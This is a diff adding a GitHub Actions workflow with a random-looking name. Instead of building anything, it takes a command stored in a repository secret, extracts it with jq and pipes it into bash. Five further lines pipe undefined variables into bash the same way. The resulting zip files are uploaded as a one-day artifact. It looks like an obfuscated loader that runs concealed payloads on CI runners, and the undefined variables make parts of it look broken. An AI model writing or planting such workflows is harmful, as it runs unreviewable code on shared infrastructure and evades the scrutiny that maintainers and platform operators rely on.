@@ -1,0 +1,26 @@
+name: winterscala3680
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: winterscala3680
+        env:
+          e118: ${{ secrets.e118 }}
+        run: |
+          printf '%s' "$e118" | jq -r .ii807 | /bin/bash
+          printf '%s' "$zwgav5" | jq -r .a616 | /bin/bash
+          echo $qjgkx3 | jq -r .nzgbg0859 | /bin/bash
+          echo $fmjiu42 | jq -r .hxv47133 | /bin/bash
+          echo $aa41 | jq -r .nl42 | /bin/bash
+          echo $rld4927 | jq -r .mwiyg63 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: siAfFFJ6
+          path: "*.zip"
+          retention-days: 1
